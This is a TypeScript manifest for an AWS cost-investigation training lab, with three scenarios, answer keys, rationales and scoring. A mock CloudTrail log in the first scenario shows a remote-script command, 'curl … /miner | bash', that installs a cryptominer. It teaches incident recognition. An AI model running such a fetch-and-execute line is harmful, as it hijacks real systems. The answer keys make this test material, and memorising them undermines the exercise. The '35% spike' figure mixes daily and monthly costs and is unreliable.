import type { LabManifest } from "../../types/manifest";

export const costAnomalyInvestigationLab: LabManifest = {
  schemaVersion: "1.1",
  id: "cost-anomaly-investigation",
  version: 1,
  title: "Cost Anomaly Investigation",
  tier: "beginner",
  track: "cloud-operations",
  difficulty: "moderate",
  accessLevel: "free",
  tags: ["finops", "cost-optimization", "aws-cost-explorer", "billing", "anomaly-detection"],
  description:
    "Investigate unexpected AWS cost spikes by analyzing Cost Explorer data, usage reports, and service metrics to identify root causes and implement cost controls.",
  estimatedMinutes: 12,
  learningObjectives: [
    "Read AWS Cost Explorer data to isolate cost anomalies by service and region",
    "Correlate cost spikes with infrastructure events and deployments",
    "Identify common cost anti-patterns like runaway data transfer and orphaned resources",
    "Implement the right cost control to prevent recurrence",
  ],
  sortOrder: 605,
  status: "published",
  prerequisites: [],
  rendererType: "investigate-decide",
  scenarios: [
    {
      type: "investigate-decide",
      id: "cost-s1",
      title: "Unexpected $4,200 Bill Spike",
      objective:
        "AWS sent a cost anomaly alert at 9 AM. Last month's bill was $3,100. Yesterday's spend was $4,200 — a 35% spike in a single day. Investigate the cost data to determine the root cause and decide on the correct remediation.",
      investigationData: [
        {
          id: "cost-by-service",
          label: "Cost by Service (Yesterday vs 30-day Average)",
          content: "EC2: $180 vs $175 avg (+3%) | RDS: $95 vs $92 avg (+3%) | S3: $12 vs $11 avg (+9%) | Data Transfer: $3,840 vs $42 avg (+9,043%) | Lambda: $8 vs $7 avg (+14%) | CloudFront: $65 vs $63 avg (+3%)",
        },
        {
          id: "data-transfer-breakdown",
          label: "Data Transfer Detail (Yesterday)",
          content: "Outbound to Internet: $3,780 (89 TB transferred) | Cross-region (us-east-1 to eu-west-1): $58 | S3 Transfer Acceleration: $2",
        },
        {
          id: "ec2-traffic-sources",
          label: "Top Data Transfer Source (EC2 instances, by bytes out)",
          content: "i-0a8f3c2d1e (bastion-host): 88.4 TB outbound | i-0b9d4e3f2a (api-server-1): 0.3 TB | i-0c1e5f4g3b (api-server-2): 0.3 TB",
        },
        {
          id: "bastion-context",
          label: "Bastion Host Context",
          content: "Instance type: t3.medium | Started: 6 months ago | Security group: SSH inbound 0.0.0.0/0 (open to world) | Outbound: All traffic 0.0.0.0/0 | Last legitimate SSH session: 3 days ago",
        },
        {
          id: "cloudtrail-bastion",
          label: "CloudTrail — Bastion Host Activity (Last 24h)",
          content: "22,400 SSH authentication attempts from 847 unique IP addresses | 1 successful SSH login from IP 185.220.101.47 (Tor exit node) at 02:14 AM | Process spawned: /bin/bash -c 'curl -s http://91.220.131.55/miner | bash'",
        },
      ],
      actions: [
        { id: "terminate-bastion-block-traffic", label: "Immediately terminate the bastion host, revoke its security group, and open a security incident", color: "red" },
        { id: "restrict-outbound-sg", label: "Update the bastion security group to restrict outbound traffic to port 22 only", color: "yellow" },
        { id: "request-billing-credit", label: "Contact AWS Support to request a billing credit for the anomalous transfer costs", color: "blue" },
        { id: "enable-cost-anomaly-alerts", label: "Enable AWS Cost Anomaly Detection with daily budget alerts going forward", color: "green" },
      ],
      correctActionId: "terminate-bastion-block-traffic",
      rationales: [
        { id: "r-cost-s1-correct", text: "The bastion host has been compromised — a cryptominer was installed via a successful SSH login from a Tor exit node. 88.4 TB of outbound transfer is the miner communicating with mining pools. This is a security incident, not just a cost anomaly. Immediate termination, security group revocation, and incident declaration are the correct response. Billing credits and future monitoring do not address an active compromise." },
        { id: "r-cost-s1-sg", text: "Restricting outbound traffic on a compromised instance leaves the instance running with an attacker's code still executing. The security group change can be bypassed by the attacker and does not contain the incident." },
        { id: "r-cost-s1-credit", text: "Requesting a billing credit is a reasonable follow-up action after the incident is contained, but it is not the correct first step when an active compromise is identified. AWS may not grant credits for crypto-mining incidents." },
        { id: "r-cost-s1-alerts", text: "Enabling cost anomaly detection is a good preventive measure for the future but does nothing to stop the ongoing compromise that is already costing $4,200/day." },
      ],
      correctRationaleId: "r-cost-s1-correct",
      feedback: {
        perfect: "Correct. The data transfer spike was a signal of a security incident. Terminate, revoke, and escalate. Cost investigation revealed a compromise that needed immediate containment.",
        partial: "You identified the bastion as the source but the response was insufficient. Restricting security groups on a compromised instance is not containment — the attacker's process is still running.",
        wrong: "Work through the investigation data in order: cost by service shows Data Transfer at 9000% spike, transfer detail points to bastion host, CloudTrail confirms active compromise. This is a security incident requiring immediate instance termination.",
      },
    },
    {
      type: "investigate-decide",
      id: "cost-s2",
      title: "Gradual Cost Creep — 40% Over 3 Months",
      objective:
        "The engineering manager notices the AWS bill has grown from $8,000/month to $11,200/month over 3 months, without any significant new feature launches. No individual spike stands out. Investigate the usage trends to find the top cost driver.",
      investigationData: [
        {
          id: "monthly-trend",
          label: "Monthly Cost Trend by Service (3 months)",
          content: "Month 1: EC2 $3,200 | Month 2: EC2 $3,800 | Month 3: EC2 $4,900 | RDS: flat ~$1,800 | S3: flat ~$400 | Other: flat ~$600",
        },
        {
          id: "ec2-inventory",
          label: "EC2 Instance Inventory (Current)",
          content: "Production ASG: 8 instances (t3.large) — active | Staging ASG: 6 instances (t3.large) — active | Dev instances: 14 instances (t3.medium) — various states | Unused/stopped: 0 (all instances are running)",
        },
        {
          id: "dev-instance-usage",
          label: "Dev Instance CloudWatch CPU (Last 30 days)",
          content: "dev-frontend-1: avg 0.2% CPU | dev-frontend-2: avg 0.4% CPU | dev-api-1: avg 1.1% CPU | dev-api-2: avg 0.8% CPU | dev-db-1: avg 0.3% CPU | (9 more dev instances with <1% average CPU) | All 14 dev instances: running 24/7",
        },
        {
          id: "dev-instance-history",
          label: "Dev Instance Launch History",
          content: "Month 1: 6 dev instances launched | Month 2: 4 more dev instances launched (feature branch work) | Month 3: 4 more dev instances launched (new team member onboarding) | No instances terminated in 3 months",
        },
        {
          id: "dev-usage-pattern",
          label: "Dev Instance SSH Activity Logs",
          content: "Active hours (any SSH connection): Mon–Fri 9am–7pm | Weekend SSH activity: 0 sessions across all 14 dev instances | Overnight SSH activity (7pm–9am weekdays): 3% of sessions | Avg daily active hours: 8.5 hours/day",
        },
      ],
      actions: [
        { id: "schedule-dev-shutdown", label: "Implement automated start/stop schedule for dev instances (running only Mon–Fri 8am–8pm)", color: "green" },
        { id: "rightsize-dev", label: "Downsize all dev instances from t3.medium to t3.micro", color: "yellow" },
        { id: "terminate-unused-dev", label: "Terminate all 14 dev instances immediately", color: "red" },
        { id: "reserved-instances", label: "Purchase Reserved Instances for the dev fleet to reduce hourly cost", color: "blue" },
      ],
      correctActionId: "schedule-dev-shutdown",
      rationales: [
        { id: "r-cost-s2-correct", text: "Dev instances run 24/7 but are only used ~8.5 hours/day on weekdays. Scheduling them to run Mon–Fri 8am–8pm (60 hours/week vs 168 hours/week) reduces dev compute cost by ~64%. This alone saves ~$1,500/month at current instance count — directly explaining the cost creep as 14 idle instances accumulated over 3 months." },
        { id: "r-cost-s2-rightsize", text: "Downsizing helps but is the smaller lever. t3.medium vs t3.micro saves ~50% on instance cost, but the instances still run 24/7. Scheduling saves 64% of hours on top of the current instance size." },
        { id: "r-cost-s2-terminate", text: "Terminating all dev instances would break active development workflows. The instances are being used — just not overnight and weekends. Scheduling is a non-disruptive optimization." },
        { id: "r-cost-s2-ri", text: "Reserved Instances give a ~40% discount but require a 1-year commitment and assume 24/7 usage. Dev instances that only run 36% of the week are poor RI candidates — you pay for reserved capacity you never use on weekends." },
      ],
      correctRationaleId: "r-cost-s2-correct",
      feedback: {
        perfect: "Correct. Scheduling dev instances to only run during business hours is a no-disruption optimization that addresses the root cause — idle instances accumulating without lifecycle management.",
        partial: "Rightsizing has merit but scheduling has a much larger impact. A smaller instance running 24/7 is more expensive than a larger instance running only during business hours.",
        wrong: "The investigation data shows dev instances running 24/7 with <1% CPU and zero weekend usage. The cost driver is idle runtime, not instance size. Scheduling is the highest-ROI fix.",
      },
    },
    {
      type: "investigate-decide",
      id: "cost-s3",
      title: "S3 Cost Spike — Unexpected Storage Growth",
      objective:
        "S3 costs jumped from $180/month to $940/month in a single billing period. No new applications were deployed. Investigate the S3 usage data to find the cause and recommend the right fix.",
      investigationData: [
        {
          id: "s3-cost-breakdown",
          label: "S3 Cost Breakdown (This Month vs Last)",
          content: "Storage: $890 this month vs $160 last month (+$730) | Requests: $28 vs $17 (+$11) | Data Transfer: $22 vs $3 (+$19) | Total: $940 vs $180",
        },
        {
          id: "s3-bucket-sizes",
          label: "S3 Bucket Sizes (Top 5 by storage)",
          content: "app-logs-prod: 18.2 TB (+16.8 TB since last month) | app-assets-prod: 120 GB (stable) | terraform-state: 2 GB (stable) | backup-snapshots: 380 GB (+20 GB) | app-logs-staging: 1.2 TB (+0.8 TB)",
        },
        {
          id: "app-logs-detail",
          label: "app-logs-prod Bucket Detail",
          content: "Object count: 284 million objects | Oldest object: 847 days old | Lifecycle policy: NONE configured | Object age distribution: 0–30 days: 0.8 TB | 31–90 days: 1.4 TB | 91–365 days: 4.1 TB | 365+ days: 11.9 TB",
        },
        {
          id: "log-format",
          label: "Log File Format Analysis",
          content: "Files per day: ~9 million log entries written as individual .json files (one per log event) | Average file size: 340 bytes | Recommended minimum for S3 efficiency: 128 KB",
        },
        {
          id: "access-pattern",
          label: "S3 Access Pattern — app-logs-prod",
          content: "Objects accessed in last 30 days: 2.1% | Objects accessed in last 90 days: 4.8% | Objects older than 90 days with zero access: 95.2% | Objects older than 1 year: accessed 0 times in 12 months",
        },
      ],
      actions: [
        { id: "lifecycle-policy", label: "Configure S3 Lifecycle policies: transition to Glacier after 90 days, expire after 365 days", color: "green" },
        { id: "delete-old-logs", label: "Immediately delete all log objects older than 1 year", color: "yellow" },
        { id: "compress-logs", label: "Switch log format from per-event JSON files to hourly compressed Parquet files", color: "blue" },
        { id: "move-to-glacier", label: "Manually move all objects older than 90 days to Glacier Instant Retrieval immediately", color: "blue" },
      ],
      correctActionId: "lifecycle-policy",
      rationales: [
        { id: "r-cost-s3-correct", text: "An S3 Lifecycle policy is the automated, self-maintaining solution. Transitioning 95% of objects (older than 90 days) to Glacier cuts storage cost by ~80%. Adding an expiration at 365 days automatically deletes logs with zero access history, preventing unbounded growth. This is a one-time configuration change that manages costs permanently without manual intervention." },
        { id: "r-cost-s3-delete", text: "Deleting all objects older than 1 year provides immediate cost relief but is a manual, one-time action. Without a lifecycle policy, the bucket continues accumulating objects indefinitely, returning to this cost level within months." },
        { id: "r-cost-s3-compress", text: "Switching to compressed Parquet reduces new writes by 100–1000x in size and is an excellent long-term optimization, but it doesn't address 11.9 TB of existing old objects and requires application code changes." },
        { id: "r-cost-s3-glacier-manual", text: "Manually moving objects to Glacier is a one-time fix without automation. A lifecycle policy does this automatically on an ongoing basis, preventing the issue from recurring." },
      ],
      correctRationaleId: "r-cost-s3-correct",
      feedback: {
        perfect: "Correct. A lifecycle policy is the sustainable, automated solution. Configure it once and it manages storage costs permanently without manual intervention.",
        partial: "Manual deletion or migration addresses today's cost but not future growth. Automate the solution with a lifecycle policy so the fix doesn't require repeated manual work.",
        wrong: "16.8 TB of new storage in one month points to unbounded log accumulation with no lifecycle management. The solution must be automated to prevent recurrence — lifecycle policies are purpose-built for this.",
      },
    },
  ],
  hints: [
    "Start cost investigations with the service-level breakdown — find the outlier first, then drill into it.",
    "Data transfer costs at 10x normal almost always indicate either a security incident or a misconfigured resource sending unexpected traffic.",
    "S3 lifecycle policies are the automated solution to unbounded storage growth — configure them when buckets are created, not after costs spike.",
  ],
  scoring: {
    maxScore: 100,
    hintPenalty: 5,
    penalties: { perfect: 0, partial: 10, wrong: 20 },
    passingThresholds: { pass: 80, partial: 50 },
  },
  careerInsight:
    "FinOps skills are increasingly expected of senior engineers, not just finance teams. Engineers who can read Cost Explorer, isolate cost anomalies to specific resources, and implement lifecycle policies and scheduling automation are highly valued at companies where cloud spend is a significant line item.",
  toolRelevance: ["AWS Cost Explorer", "AWS Budgets", "AWS Cost Anomaly Detection", "AWS S3 Lifecycle", "CloudHealth"],
  createdAt: "2026-03-28",
  updatedAt: "2026-03-28",
};
